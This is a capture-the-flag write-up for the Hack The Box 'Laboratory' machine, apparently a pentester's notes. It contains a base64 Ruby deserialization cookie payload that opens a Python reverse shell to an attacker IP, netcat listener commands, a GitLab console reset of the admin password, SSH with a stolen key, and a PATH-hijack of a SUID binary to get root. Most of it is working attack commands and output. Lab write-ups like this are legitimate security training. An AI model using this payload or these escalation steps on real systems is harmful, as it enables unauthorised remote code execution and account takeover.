BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiAiQBI2NvZGluZzpVVEYtOApfZXJib3V0ID0gKycnOyBfZXJib3V0Ljw8KCggYHB5dGhvbjMgLWMgJ2ltcG9ydCBzb2NrZXQsc3VicHJvY2VzcyxvcztzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTtzLmNvbm5lY3QoKCIxMC4xMC4xNC4xNDciLDExMTEpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOycgJmAgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=--99a3dfcf90767bdb3f0e6ea7bd365b198ca0ad69

# Reverse shell

in one kali shell:
```
┌──(kali㉿kali)-[~]
└─$ nc -l -p 1111
```
in another shell:
```
┌──(kali㉿kali)-[~]
└─$ curl -vvv https://git.laboratory.htb/users/sign_in -k -b "experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiAiQBI2NvZGluZzpVVEYtOApfZXJib3V0ID0gKycnOyBfZXJib3V0Ljw8KCggYHB5dGhvbjMgLWMgJ2ltcG9ydCBzb2NrZXQsc3VicHJvY2VzcyxvcztzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTtzLmNvbm5lY3QoKCIxMC4xMC4xNC4xNDciLDExMTEpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOycgJmAgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=--99a3dfcf90767bdb3f0e6ea7bd365b198ca0ad69"
...
* Connection #0 to host git.laboratory.htb left intact

```

finally:
```
┌──(kali㉿kali)-[~]
└─$ nc -l -p 1111
/bin/sh: 0: can't access tty; job control turned off
$ 

```

## Search user flag
```
$ python3 -c "import pty; pty.spawn('/bin/sh')"
git@git:/assets$ export TERM=xterm

```

## Search/change info with ruby console
[Updating a rails password via the rails console](https://jjasghar.github.io/blog/2014/05/02/updating-a-rails-password-via-the-rails-console/)
[How to reset your root password](https://docs.gitlab.com/12.10/ee/security/reset_root_password.html)
```
┌──(kali㉿kali)-[~]
└─$ nc -l -p 1111                                                                                                                                                                                                                      1 ⨯
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c "import pty; pty.spawn('/bin/sh')"
$ export TERM=xterm                                                                                                                                                                                                                        
export TERM=xterm                                                                                                                                                                                                                          
$ gitlab-rails console                                                                                                                                                                                                                     
gitlab-rails console                                                                                                                                                                                                                       
--------------------------------------------------------------------------------                                                                                                                                                           
 GitLab:       12.8.1 (d18b43a5f5a) FOSS                                                                                                                                                                                                   
 GitLab Shell: 11.0.0                                                                                                                                                                                                                      
 PostgreSQL:   10.12                                                                                                                                                                                                                       
--------------------------------------------------------------------------------                                                                                                                                                           
Loading production environment (Rails 6.0.2)                                                                                                                                                                                               
irb(main):001:0> u = User.find_by_id(1)                                                                                                                                                                                                    
u = User.find_by_id(1)                                                                                                                                                                                                                     
=> #<User id:1 @dexter>                                                                                                                                                                                                                    
irb(main):002:0> u                                                                                                                                                                                               
u
=> #<User id:1 @dexter>
irb(main):003:0> u.password = "password"
u.password = "password"
=> "password"
irb(main):004:0> u.password_confirmation "password"
u.password_confirmation "password"
Traceback (most recent call last):
        1: from (irb):4
ArgumentError (wrong number of arguments (given 1, expected 0))
irb(main):005:0> u.save
u.save
Enqueued ActionMailer::DeliveryJob (Job ID: f27b13ba-8ba1-4a88-92e3-edb226c3dd50) to Sidekiq(mailers) with arguments: "DeviseMailer", "password_change", "deliver_now", #<GlobalID:0x00007f6f9b2e80d0 @uri=#<URI::GID gid://gitlab/User/1>>
=> true
```
password changed, we can login:
![Gitlab Dexter Login](./images/gitlab_login_dexter.png "Gitlab Dexter Login")

## private key in SecureDocker repo
save ssh private key in local and ssh to machine:
```
┌──(kali㉿kali)-[~/htb-laboratory/files]
└─$ chmod 600 id_rsa                                                                                                                                                                                                                 130 ⨯
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/htb-laboratory/files]
└─$ ssh -i id_rsa dexter@10.10.10.216 
dexter@laboratory:~$
```

# USER FLAG
```
dexter@laboratory:~$ pwd
/home/dexter
dexter@laboratory:~$ cat user.txt 
344d4c2b219076e3a170acd4346a3d01

```
## LinEnum - linpeas
(sent with scp)
Nano linpeas.sh, chmod +x and execute
Interesting:
- CVES:
  - RTru64_UNIX_4.0g(CVE-2002-1614)
  ```
  -rwsr-sr-x 1 daemon daemon           55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)

  ```
  - Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
  ```
  -rwsr-xr-x 1 root   root             31K Aug 16  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)

  ```
- SUID:
  - /usr/local/bin/docker-security:
    ```
    ====================================( Interesting Files )=====================================
    [+] SUID - Check easy privesc, exploits and write perms                                                                                                                                                                         
    [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid

    ...

    -rwsr-xr-x 1 root   dexter           17K Aug 28 14:52 /usr/local/bin/docker-security

    ```

## Privilege escalation -> SUID + path variable
[SUID and SGID](https://www.tecmint.com/how-to-find-files-with-suid-and-sgid-permissions-in-linux/)
[Privilege wscalation using path variable](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/)

```
dexter@laboratory:/usr/local/bin$ cat docker-security 
ELF>p@�9@8
          @@@@h�������   ���-�=�=X`�-�=�=����DDP�tdH H H <<Q�tdR�td�-�=�=▒▒/lib64/ld-linux-x86-64.so.2GNU�f��T�'N]�N�����fGN�e�mM%i x "setuidsystem__cxa_finalizesetgid__libc_start_mainlibc.so.6GLIBC_2.2.5_ITM_deregisterTMCloneTable__gmH�=��F/�DH�=�/H��/H9�tH�/H��teTa�����H�=i/H�5b/H)�H��H��?H��H�H��tH��.H����fD���=)/u/UH�=�.H��t��%�/h������%�/h������%�/f�1�I��^H��H���PTL�jH�
                                                                                               H�=
����H��������0zRx��{���UH��������������H�=������H�=�������]��AWL�=O,AVI��AUI��ATA��UH�-@,SL)�H��C���H��t�L��L��D��A��H��H9�u�H�[]A\A]A^A_��H�H��chmod 700 /usr/bin/dockerchmod 660 /var/run/docker.sock<�����▒����(���X
                ����+zRx
                       $H���@F▒J
n                               �?▒;*3$"D`��\=���3A�C
D|X���]B�I▒�E �E(�D0�H8�G@j8A0A(B B▒B�p���P7
��▒���0o
�
 ▒@H��  ▒������o����o���o����o�=6FV8@GCC: (Debian 10.1.0-6) 10.1.0���   �
�

`p� H � �=�=�=�?@▒0@@@▒��
                         ��!7@@C�=jPv�=�������!����=��=��=�H �@�

                                                                �s ▒0@7▒@@�>Rq▒0@~ �▒8@� ��]�H@wp+�@@�U3��▒@@� ▒"crtstuff.cderegister_tm_clones__do_global_dtors_auxcompleted.0__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entrydocker-security.c__FRAME_END____init_array_end_DYNAMIC__init_array_start__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_csu_fini_ITM_deregisterTMCloneTable_edatasystem@@GLIBC_2.2.5__libc_start_main@@GLIBC_2.2.5__data_start__gmon_start____dso_handle_IO_stdin_used__libc_csu_init__bss_startmainsetgid@@GLIBC_2.2.5__TMC_END___ITM_registerTMCloneTablesetuid@@GLIBC_2.2.5__cxa_finalize@@GLIBC_2.2.5.symtab.strtab.shstrtab.interp.note.gnu.build-id.note.ABI-tag.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.plt.got.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.dynamic.got.plt.data.bss.comment�#��$6�� D��No
                                                                                                                                                                                            00�^���o��k���o��z��▒�B��▒��  @�pp����      �  �H H <�� ������=�-��?��@�0@0@@@�0@0`00▒ �64�8
```
chmod without full path /usr/bin/chmod, we can elevate privileges with that

### tool pspy64
[PSPY64](https://github.com/DominicBreuker/pspy)
(sent with scp)


in one shell:
```
dexter@laboratory:~$ ./pspy64 
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2020/12/27 16:16:33 CMD: UID=0    PID=961    | /lib/systemd/systemd-logind 
2020/12/27 16:16:33 CMD: UID=0    PID=960    | /usr/lib/snapd/snapd 
2020/12/27 16:16:33 CMD: UID=104  PID=959    | /usr/sbin/rsyslogd -n -iNONE 
2020/12/27 16:16:33 CMD: UID=0    PID=958    | /usr/sbin/irqbalance --foreground 
2020/12/27 16:16:33 CMD: UID=103  PID=944    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only 
2020/12/27 16:16:33 CMD: UID=0    PID=943    | /usr/lib/accountsservice/accounts-daemon 
2020/12/27 16:16:33 CMD: UID=0    PID=9      | 
2020/12/27 16:16:33 CMD: UID=0    PID=868    | /usr/bin/vmtoolsd 
2020/12/27 16:16:33 CMD: UID=0    PID=867    | /usr/bin/VGAuthService 
2020/12/27 16:16:33 CMD: UID=998  PID=86156  | sleep 1 
2020/12/27 16:16:33 CMD: UID=0    PID=86134  | 
2020/12/27 16:16:33 CMD: UID=1000 PID=86115  | ./pspy64 
...
2020/12/27 16:16:40 CMD: UID=0    PID=86174  | ./docker-security 
2020/12/27 16:16:40 CMD: UID=0    PID=86176  | sh -c chmod 700 /usr/bin/docker 
2020/12/27 16:16:40 CMD: UID=0    PID=86175  | sh -c chmod 700 /usr/bin/docker 
2020/12/27 16:16:40 CMD: UID=0    PID=86177  | sh -c chmod 660 /var/run/docker.sock 
...
```
in other shell:
```
dexter@laboratory:/usr/local/bin$ ./docker-security 

```
interesting:
```
...
2020/12/27 16:16:40 CMD: UID=0    PID=86174  | ./docker-security 
2020/12/27 16:16:40 CMD: UID=0    PID=86176  | sh -c chmod 700 /usr/bin/docker 
2020/12/27 16:16:40 CMD: UID=0    PID=86175  | sh -c chmod 700 /usr/bin/docker 
2020/12/27 16:16:40 CMD: UID=0    PID=86177  | sh -c chmod 660 /var/run/docker.sock 
...
```

# ROOT FLAG
privilege escalation:
```
dexter@laboratory:~$ cd /tmp/
dexter@laboratory:/tmp$ echo "python3 -c \"import pty; pty.spawn('/bin/sh')\"" > chmod
dexter@laboratory:/tmp$ chmod +x chmod
dexter@laboratory:/tmp$ PATH=$(pwd):$PATH
dexter@laboratory:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin
dexter@laboratory:/tmp$ docker-security 
# whoami
root
# cat /root/root.txt
210cebe534d0b60900c24d740458a74f

```